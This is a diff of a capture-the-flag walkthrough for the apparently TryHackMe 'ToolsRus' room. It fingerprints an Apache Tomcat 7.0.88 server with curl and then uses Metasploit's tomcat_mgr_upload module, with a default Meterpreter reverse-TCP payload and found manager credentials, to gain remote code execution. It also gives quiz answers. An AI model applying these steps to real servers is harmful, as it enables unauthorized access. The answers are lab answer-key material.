@@ -128,30 +128,13 @@ Finished
 <p>I also tried the following command line to discover the name and version of the service running ...</p>
 
 <pre><code>root@ip-[THM AttackBox]:~/ToolsRus# curl -s http://[Target_IP]:[Target_Port] | grep Tomcat
-       <title>Apache Tomcat/7.0.88</title>
-                <h1>Apache Tomcat/7.0.88</h1>
-                    <h2>If you're seeing this, you've successfully installed Tomcat. Congratulations!</h2>
-                        <p><a href="/docs/setup.html">Tomcat Setup</a></p>
-                        <p><a href="http://wiki.apache.org/tomcat/TomcatVersions">Tomcat Versions</a></p>
-                        <h3>Managing Tomcat</h3>
-                        <p>In Tomcat 7.0 access to the manager application is split between
-                        <h4><a href="/docs/">Tomcat 7.0 Documentation</a></h4>
-                        <h4><a href="/docs/config/">Tomcat 7.0 Configuration</a></h4>
-                        <h4><a href="http://wiki.apache.org/tomcat/FrontPage">Tomcat Wiki</a></h4>
-                            <li><a href="http://tomcat.apache.org/bugreport.html">Tomcat 7.0 Bug Database</a></li>
-                            <li><a href="/docs/api/index.html">Tomcat 7.0 JavaDocs</a></li>
-                            <li><a href="http://svn.apache.org/repos/asf/tomcat/tc7.0.x/">Tomcat 7.0 SVN Repository</a></li>
-                            <li><a href="http://tomcat.apache.org/download-connectors.cgi">Tomcat Connectors</a></li>
-                            <li><a href="http://tomcat.apache.org/download-native.cgi">Tomcat Native</a></li>
-                            <li><a href="http://tomcat.apache.org/connectors-doc/">Tomcat Connectors</a></li>
-                            <li><a href="http://tomcat.apache.org/native-doc/">Tomcat Native</a></li>
 </code></pre>
-
 
 <p>and I got ...</p>
 
-<pre><code></code></pre>
+![image](https://github.com/user-attachments/assets/700cae60-de36-4b47-8f38-1aebcb69e674)
 
+<br>
 
 > 1.7. <em>Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files did Nikto identify?</em><br><a id='1.7'></a>
 >> <strong>5</strong><br>
@@ -252,44 +235,58 @@ Nmap done: 1 IP address (1 host up) scanned in 346.53 seconds
 
 <br>
 
-<pre><code>root@[THM AttackBox]:~/ToolsRus# msfconsole
-Metasploit tip: Use sessions -1 to interact with the last opened session
-                                                  
-     ,           ,
-    /             \
-   ((__---,,,---__))
-      (_) O O (_)_________
-         \ _ /            |\
-          o_o \   M S F   | \
-               \   _____  |  *
-                |||   WW|||
-                |||     |||
+<p>I used <code>msfconsole -q</code> so that the initial banner was no printed.</p>
 
-
-       =[ metasploit v6.4.38-dev-                         ]
-+ -- --=[ 2460 exploits - 1266 auxiliary - 430 post       ]
-+ -- --=[ 1468 payloads - 49 encoders - 11 nops           ]
-+ -- --=[ 9 evasion                                       ]
-
-Metasploit Documentation: https://docs.metasploit.com/
-
+<pre><code>root@[THM AttackBox]:~/ToolsRus# msfconsole-q 
 msf6 >
+</code></pre>
+
+<p>Then I searched for <code>search tomcat</code>, and there were 70 different options.</p>
+
+<p>I decided to search again using <code>tomcat upload</code> and I got 26 options.</p>
+
+<p>I chose <code>exploit/multi/http/tomcat_mgr_upload</code></p>
+
+
+<pre><code>
+msf6 > search tomcat upload
+earch tomcat upload
+
+Matching Modules
+================
+
+   #   Name                                                         Disclosure Date  Rank       Check  Description
+   -   ----                                                         ---------------  ----       -----  -----------
+   0   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
+...
+  7   exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+...
+
+Interact with a module by name or index. For example info 26, use 26 or use exploit/multi/http/tomcat_jsp_upload_bypass
+After interacting with a module you can manually set a TARGET with set TARGET 'Java Linux'
 </code></pre>
 
 <br>
 
-<pre><code>
-msf6 > search tomcat
-  
-Matching Modules
-================
+<pre><code>sf6 > use 7
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/http/tomcat_mgr_upload) ></code></pre>
 
-   #   Name                                                                       Disclosure Date  Rank       Check  Description
-   -   ----                                                                       ---------------  ----       -----  -----------
-   0   auxiliary/dos/http/apache_commons_fileupload_dos                           2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
-...
-  
-</code></pre>
+<br>
+
+<pre><code>msf6 exploit(multi/http/tomcat_mgr_upload) > options</code></pre>
+
+<p><strong>Note</strong>: I you are running <code>THM AttackBox</code>, LHOST will be its IP.</p>
+
+<p>After updating the <code>options</code>, I used <code>exploit</code> command.</p>
+
+
+
+
+<br>
+
+<p>I set LHOST, RHOSTS, RPORT, HttpUsername and HttpPassword.</p>
+
 
 > 1.11. <em>What flag is found in the root directory?</em><br><a id='1.11'></a>
 >> <strong>root</strong><br>
